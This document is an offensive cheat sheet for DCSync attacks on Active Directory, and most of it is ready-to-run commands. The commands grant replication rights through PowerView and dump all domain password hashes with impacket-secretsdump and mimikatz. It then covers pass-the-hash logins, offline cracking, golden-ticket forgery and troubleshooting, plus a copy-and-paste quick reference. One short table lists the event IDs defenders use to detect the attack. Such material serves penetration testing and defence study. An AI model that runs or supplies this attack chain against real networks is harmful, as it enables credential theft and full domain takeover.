
---

## What is DCSync?

DCSync abuses the **Directory Replication Service (DRS)** protocol to impersonate a Domain Controller and request password data from a real DC. The attacker never needs to touch LSASS or log into the DC directly.

**Required Right:** `DS-Replication-Get-Changes-All`

---

## Who Has DCSync Rights by Default?

|Group|Has DCSync|
|---|---|
|Domain Admins|Yes|
|Enterprise Admins|Yes|
|Administrators|Yes|
|Domain Controllers|Yes|
|Any user with WriteDacl on domain|Can grant themselves DCSync|

---

## Attack Paths to DCSync

### Path 1 — You Already Have DA / Enterprise Admin

```
Domain Admin / Enterprise Admin
        ↓
Run secretsdump directly
```

### Path 2 — You Have WriteDacl on the Domain

```
User with WriteDacl on DC=domain,DC=local
        ↓
Add-DomainObjectAcl → Grant DCSync to yourself
        ↓
Run secretsdump
```

### Path 3 — You Have GenericAll on a Group with WriteDacl

```
Compromised User
        ↓  GenericAll on group
Group with WriteDacl on domain
        ↓  Add yourself to that group
WriteDacl on DC=domain,DC=local
        ↓  Grant DCSync
Run secretsdump
```

### Path 4 — You Have GenericWrite / ForceChangePassword

```
Compromised User
        ↓  Reset password of DA user
Login as DA
        ↓
Run secretsdump
```

---

## Step 0 — Enumerate Who Has DCSync Rights

```powershell
# Using PowerView — find all users with replication rights on the domain
Get-DomainObjectAcl "DC=domain,DC=local" -ResolveGUIDs |
  Where-Object { $_.ObjectAceType -match 'Replication-Get' } |
  Select SecurityIdentifier, ObjectAceType |
  fl

# Resolve SID to username
Convert-SidToName <SID>

# Or all in one
Get-DomainObjectAcl "DC=domain,DC=local" -ResolveGUIDs |
  Where-Object { $_.ObjectAceType -match 'Replication-Get' } |
  ForEach-Object { Convert-SidToName $_.SecurityIdentifier }
```

```bash
# From Kali using BloodHound / ldapdomaindump
bloodhound-python -u user -p password -d domain.local -ns <DC_IP> -c All
```

---

## Step 1 — Grant DCSync Rights (If You Have WriteDacl)

```powershell
# Build credential object
$SecPass = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $SecPass)

# Grant DCSync to yourself or another user
Add-DomainObjectAcl -Credential $Cred \
  -TargetIdentity "DC=domain,DC=local" \
  -PrincipalIdentity targetuser \
  -Rights DCSync \
  -Verbose
```

**Success — look for these 3 GUIDs:**

```
1131f6aa  →  DS-Replication-Get-Changes
1131f6ad  →  DS-Replication-Get-Changes-All   ← critical one
89e95b76  →  DS-Replication-Get-Changes-In-Filtered-Set
```

---

## Step 2 — Verify DCSync Rights Were Granted

```powershell
$sid = (Get-DomainUser targetuser).objectsid

Get-DomainObjectAcl "DC=domain,DC=local" -ResolveGUIDs |
  Where-Object {
    $_.SecurityIdentifier -match $sid -and
    $_.ObjectAceType -match 'Replication'
  } |
  Select ObjectAceType, ActiveDirectoryRights
```

---

## Step 3 — Execute DCSync

### Option A — secretsdump (Kali, Recommended)

```bash
# Full dump
impacket-secretsdump -dc-ip <DC_IP> DOMAIN/user:'password'@DC_HOSTNAME.domain.local

# Dump only specific user
impacket-secretsdump -just-dc-user administrator -dc-ip <DC_IP> DOMAIN/user:'password'@DC_HOSTNAME.domain.local

# Save output to files
impacket-secretsdump -outputfile domain_hashes -just-dc -dc-ip <DC_IP> DOMAIN/user:'password'@DC_HOSTNAME.domain.local
```

**Output files:**

|File|Contents|
|---|---|
|`domain_hashes.ntds`|NTLM hashes|
|`domain_hashes.ntds.kerberos`|Kerberos keys|
|`domain_hashes.ntds.cleartext`|Cleartext (only if reversible encryption enabled)|

---

### Option B — Mimikatz (Windows)

```powershell
# Must run as a user who has DCSync rights
# If needed, spawn shell as that user first
runas /netonly /user:DOMAIN\targetuser powershell
```

```
.\mimikatz.exe

privilege::debug

# Dump specific user
lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\administrator

# Dump all users
lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv
```

---

### Option C — NetSync (alternative)

```bash
impacket-secretsdump -use-vss -dc-ip <DC_IP> DOMAIN/user:'password'@DC_HOSTNAME
```

> Use `-use-vss` when DRSUAPI method fails with `ERROR_DS_DRA_BAD_DN`

---

## Step 4 — Use the Hashes

### Pass-the-Hash (PTH)

```bash
# Evil-WinRM
evil-winrm -i <DC_IP> -u administrator -H <NTHASH>

# PSExec
impacket-psexec -hashes :<NTHASH> administrator@<DC_IP>

# WMIExec
impacket-wmiexec -hashes :<NTHASH> administrator@<DC_IP>

# SMBExec
impacket-smbexec -hashes :<NTHASH> administrator@<DC_IP>

# CrackMapExec
crackmapexec smb <DC_IP> -u administrator -H <NTHASH>
```

### Crack the Hash (Offline)

```bash
# Hashcat NTLM
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# John
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Golden Ticket (with krbtgt hash)

```bash
# Get krbtgt hash from secretsdump output first
# then create golden ticket with impacket
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain domain.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@DC_HOSTNAME.domain.local
```

---

## Common Errors & Fixes

|Error|Cause|Fix|
|---|---|---|
|`Access is denied` on Add-DomainObjectAcl|Wrong or low-priv creds in `$Cred`|Use the account that has WriteDacl|
|`ERROR_DS_DRA_BAD_DN`|Using IP instead of hostname|Use DC hostname, not IP. Fix `/etc/hosts`|
|`rpc_s_access_denied`|DCSync rights not applied yet or expired|Re-grant and dump immediately|
|`FindByIdentity` error|Wrong credentials format|Use `DOMAIN\user` format in PSCredential|
|secretsdump hangs|DNS not resolving|Add DC to `/etc/hosts`|
|Mimikatz `ERROR kuhl_m_lsadump_dcsync`|Not running as DCSync-privileged user|Use `runas /netonly` as correct user|

---

## Fix /etc/hosts (Always Do This)

```bash
sudo sh -c 'echo "<DC_IP>  domain.local DC01 DC01.domain.local" >> /etc/hosts'
```

---

## BloodHound Edges That Lead to DCSync

|Edge|Meaning|
|---|---|
|`DCSync`|Direct DCSync rights|
|`WriteDacl` on domain|Can grant DCSync to anyone|
|`GenericAll` on domain|Includes WriteDacl|
|`GenericAll` on group with WriteDacl|Add yourself → get WriteDacl|
|`Owns` on domain object|Full control → grant DCSync|
|`WriteOwner` on domain object|Take ownership → grant DCSync|

---

## Detection (Blue Team)

|Event ID|What it Logs|
|---|---|
|`4662`|Object access with replication rights|
|`4670`|Permissions changed on domain object|
|`4728`|Member added to security-enabled global group|
|`5136`|Directory service object modified|

---

## Full Quick Reference (Copy & Paste)

### Grant DCSync (PowerView)

```powershell
$SecPass = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $SecPass)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity targetuser -Rights DCSync
```

### Dump Hashes (Kali)

```bash
impacket-secretsdump -dc-ip <DC_IP> DOMAIN/targetuser:'PASSWORD'@DC01.domain.local
```

### Login with Hash

```bash
evil-winrm -i <DC_IP> -u administrator -H <NTHASH>
```